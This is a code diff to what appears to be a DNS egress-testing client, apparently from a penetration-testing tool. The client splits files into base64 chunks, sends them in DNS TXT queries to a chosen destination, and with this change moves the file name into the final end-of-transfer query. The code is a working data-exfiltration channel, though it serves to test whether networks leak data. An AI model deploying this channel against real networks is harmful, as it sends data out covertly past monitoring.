@@ -25,7 +25,7 @@ class Client:
             self.file_transfer = False
             self.length = 35
         else:
-            self.length = 25
+            self.length = 35
             if "/" in cli_object.file:
                 self.file_transfer = cli_object.file.split("/")[-1]
             else:
@@ -56,7 +56,7 @@ class Client:
             if not self.file_transfer:
                 encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
             else:
-                encoded_data = base64.b64encode(self.file_transfer + ".:|:." + str(packet_number) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])
+                encoded_data = base64.b64encode(str(packet_number) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])
 
                 while len(encoded_data) > self.max_length:
 
@@ -67,7 +67,7 @@ class Client:
                     else:
                         packet_diff = ((len(data_to_transmit) - byte_reader) / self.length)
                     check_total = True
-                    encoded_data = base64.b64encode(self.file_transfer + ".:|:." + str(packet_number) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])
+                    encoded_data = base64.b64encode(str(packet_number) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])
 
                 if check_total:
                     self.current_total = packet_number + packet_diff
@@ -101,7 +101,7 @@ class Client:
         while True:
             final_packet = sr1(IP(dst=final_destination)/UDP()/DNS(
                 id=15, opcode=0,
-                qd=[DNSQR(qname="ENDTHISFILETRANSMISSIONEGRESSASSESS", qtype="TXT")], aa=1, qr=0),
+                qd=[DNSQR(qname="ENDTHISFILETRANSMISSIONEGRESSASSESS" + self.file_transfer, qtype="TXT")], aa=1, qr=0),
                 verbose=True, timeout=2)
 
             if final_packet:
